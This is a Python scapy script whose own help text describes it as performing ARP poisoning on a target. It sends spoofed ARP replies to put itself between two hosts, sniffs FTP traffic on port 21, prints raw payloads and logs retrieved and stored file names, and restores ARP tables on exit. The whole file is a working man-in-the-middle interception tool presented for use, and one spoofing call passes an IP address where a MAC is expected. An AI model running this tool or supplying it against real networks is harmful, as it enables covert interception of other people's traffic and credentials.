import argparse
import time
import re
import threading
from scapy.all import *
from scapy.all import Ether, ARP, TCP, IP

def ip(address):
    ip_regex = re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", address)
    if ip_regex == None:
        print("Got value:", address)
        raise ValueError("Not an ip address!")
    return address
        
def mac(address):
    ip_regex = re.match(r"([0-9a-fA-F]:?){12}",address)
    if ip_regex == None:
        print("Got value:", address)
        raise ValueError("Not a mac address!")
    return address

parser = argparse.ArgumentParser(description="Perform ARP poisoning on a target")
parser.add_argument("ip_src", type=ip, help="Enter the ip address of the source machine")
parser.add_argument("mac_src", type=mac, help="Enter the mac address of the source machine")
parser.add_argument("ip_target", type=ip, help="Enter the ip address of the target machine")
parser.add_argument("mac_target", type=mac, help="Enter the mac address of the target machine")
parser.add_argument("-v", action="store_true", help="Verbose")

args = parser.parse_args()
stop_flag = threading.Event()
recent_packets = {}

def cleanup_recent_packets():
    current_time = time.time()
    keys_to_delete = [k for k, v in recent_packets.items() if current_time - v > 0.1]
    for k in keys_to_delete:
        del recent_packets[k]

def process_packet(packet):
    if packet.haslayer(TCP) and packet[TCP].payload:
        payload = packet[TCP].payload.load.decode('utf-8', errors='ignore')
        cleanup_recent_packets()
        if payload in recent_packets:
            return
        else:
            recent_packets[payload] = time.time()
        if args.v and packet.haslayer('Raw'):
            print(packet['Raw'].load.decode('utf-8', errors='ignore'))
        elif 'RETR ' in payload:
            filename = payload.split('RETR ')[1].split('\r\n')[0]
            print(f"File retrieved: {filename}")
        elif 'STOR ' in payload:
            filename = payload.split('STOR ')[1].split('\r\n')[0]
            print(f"File stored: {filename}")
        
def spoof(target_ip, host_ip, target_mac):
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=False)
    
def restore(target_ip, host_ip, target_mac, host_mac): 
    arp_response = ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac) 
    send(arp_response, verbose=0, count=7) 

def arp_spoof():
    while not stop_flag.is_set():
        spoof(args.ip_target, args.ip_src, args.mac_target)
        spoof(args.ip_src, args.ip_target, args.ip_src)
        time.sleep(1)
        
def packet_sniff():
    sniff(filter="tcp port 21", prn=process_packet, store=0)
    
if __name__ == "__main__":
    try:
        arp_thread = threading.Thread(target=arp_spoof)
        sniff_thread = threading.Thread(target=packet_sniff)
        arp_thread.start()
        sniff_thread.start()
        arp_thread.join()
        sniff_thread.join()
    except KeyboardInterrupt:
        stop_flag.set()
        restore(args.ip_target, args.ip_src, args.mac_target, args.mac_src)
        restore(args.ip_src, args.ip_target, args.mac_src, args.mac_target)
        print("Program stop ARP tables restored")
    except Exception as e:
        print(e)
        stop_flag.set()
        restore(args.ip_target, args.ip_src, args.mac_target, args.mac_src)
        restore(args.ip_src, args.ip_target, args.mac_src, args.mac_target)
        print("Program stop ARP tables restored")